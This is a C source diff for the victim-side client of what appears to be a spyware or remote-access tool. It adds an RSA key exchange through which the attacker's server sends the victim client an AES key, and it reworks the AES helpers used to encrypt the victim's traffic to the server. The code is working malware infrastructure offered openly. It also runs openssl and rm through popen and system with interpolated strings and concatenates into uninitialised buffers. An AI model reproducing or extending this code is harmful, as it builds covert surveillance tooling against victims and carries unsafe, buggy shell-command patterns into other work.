@@ -28,13 +28,46 @@ void log_in_victim () {
 	
 	strtok(encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, "\n"); // remove the new line
 	strtok(encrypted_message.data.encrypted_login_vicim_to_Ospy.id, "\n"); // remove the new line
-	
-	//encrypt the user name
-	strcpy(encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, encrypt_text (encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, AES_KEY));
 
 	send(V_S_socket, &encrypted_message, sizeof(encrypted_message), 0);
-	fclose(config_file);
+	fclose(config_file);	
 }
+
+void secure_key_exchange(){ // send victim's public RSA key to the server, then the server can transfer to this victim his attacker aes key
+	encrypted_general_message_protocol encrypted_message;
+	encrypted_message.i_am = VICTIM;
+	encrypted_message.action = KEY_EXCHANGE;
+	FILE * public_key_file = fopen("public_key.pem", "r");
+	FILE * encrepted_aes_key_fd;
+	FILE * rsa_decryption_fd;
+	char sub_buffer[65];
+	char encrypted_aes_key_result[RSA_BASE64_AES_KEY_SIZE];
+	char decrypt_rsa_cmd[90];
+	char delete_temp_aes_key_cmd[5 + sizeof(TEMP_RCVE_AES_KEY_FILE_NAME)];
+	
+	memset(encrypted_message.data.key_exchange_buffer, '\0', sizeof(encrypted_message.data.key_exchange_buffer));
+	memset(sub_buffer, '\0', sizeof(sub_buffer));
+	
+	while (fgets(sub_buffer, sizeof(sub_buffer), public_key_file) != NULL) // load the public_key.pem file to the buffer
+		strcat(encrypted_message.data.key_exchange_buffer, sub_buffer);	
+	send(V_S_socket, &encrypted_message, sizeof(encrypted_general_message_protocol), 0);
+	fclose(public_key_file);
+	
+	recv(V_S_socket, &encrypted_aes_key_result, sizeof(encrypted_aes_key_result), 0);
+	encrepted_aes_key_fd = fopen(TEMP_RCVE_AES_KEY_FILE_NAME, "w");
+	fprintf(encrepted_aes_key_fd, "%s", encrypted_aes_key_result);
+	fclose(encrepted_aes_key_fd);
+	
+	sprintf(decrypt_rsa_cmd, "openssl base64 -d -in %s | openssl rsautl -decrypt -inkey private_key.pem", TEMP_RCVE_AES_KEY_FILE_NAME);
+	rsa_decryption_fd = popen(decrypt_rsa_cmd, "r");
+	fgets(AES_KEY, sizeof(AES_KEY), rsa_decryption_fd);	
+	pclose(rsa_decryption_fd);
+	
+	// delete "TEMP_RCVE_AES_KEY_FILE_NAME" file
+	sprintf(delete_temp_aes_key_cmd, "rm %s", TEMP_RCVE_AES_KEY_FILE_NAME);
+	system(delete_temp_aes_key_cmd);
+}
+
 // victim to server encrypted message handler, get main_data struct and encrypt it in aes 
 void V_2_S_encrypted_message_handler(main_data data, action_type action){ // victim - server 
 	encrypted_general_message_protocol encrypted_message;
@@ -104,29 +137,35 @@ char * encrypt_text (char * text_to_encrypt, char * encrypt_key){
 	char * encrypted_text = (char *) malloc(max_len * sizeof(char));
 	char sub_buffer[65];
 	char encrypt_commend[40 + strlen(text_to_encrypt) + strlen(encrypt_key)];
-	sprintf(encrypt_commend, "echo %s | openssl aes-256-cbc -base64 -k %s", text_to_encrypt, encrypt_key); // there is injection variability, to be fix
+	FILE * temp_aes_file = fopen(ENCRYPTED_RECEIVED_DATA_NAME, "w");
+	fprintf(temp_aes_file, "%s", text_to_encrypt);
+	fclose(temp_aes_file);
+	sprintf(encrypt_commend, "openssl aes-256-cbc -base64 -in %s -k %s", ENCRYPTED_RECEIVED_DATA_NAME, encrypt_key); 
+	
 	FILE * aes_encryption_fd = popen(encrypt_commend, "r");
-	while (fgets(sub_buffer, sizeof(sub_buffer), aes_encryption_fd) != NULL) {
-		strtok(sub_buffer, "\n");
+	while (fgets(sub_buffer, sizeof(sub_buffer), aes_encryption_fd) != NULL) 
 		strcat(encrypted_text, sub_buffer);
-	}
+	
 	pclose(aes_encryption_fd);
 	return encrypted_text;
 }
-
 //AES 256 cbc decryption
 char * decrypt_text (char * text_to_decrypt, char * decryption_key){
-	strtok(text_to_decrypt, "\n");
 	char * decrypted_text = (char *) malloc(strlen(text_to_decrypt) * sizeof(char));
 	char sub_buffer[65];
 	char decrypt_commend[40 + strlen(text_to_decrypt) + strlen(decryption_key)];
-	sprintf(decrypt_commend, "echo %s | openssl aes-256-cbc -d -base64 -k %s", text_to_decrypt, decryption_key);// there is injection variability, to be fix
-
+	
+	FILE * temp_aes_file = fopen(ENCRYPTED_RECEIVED_DATA_NAME, "w");
+	fprintf(temp_aes_file, "%s", text_to_decrypt);
+	fclose(temp_aes_file);
+	sprintf(decrypt_commend, "openssl aes-256-cbc -d -in %s -base64 -k %s", ENCRYPTED_RECEIVED_DATA_NAME, decryption_key);
+	
 	FILE * aes_decryption_fd = popen(decrypt_commend, "r");
 	while (fgets(sub_buffer, sizeof(sub_buffer), aes_decryption_fd) != NULL) {
-		strtok(sub_buffer, "\n");
+//		strtok(sub_buffer, "\n");
 		strcat(decrypted_text, sub_buffer);
 	}	
 	pclose(aes_decryption_fd);
 	return decrypted_text;
 }
+
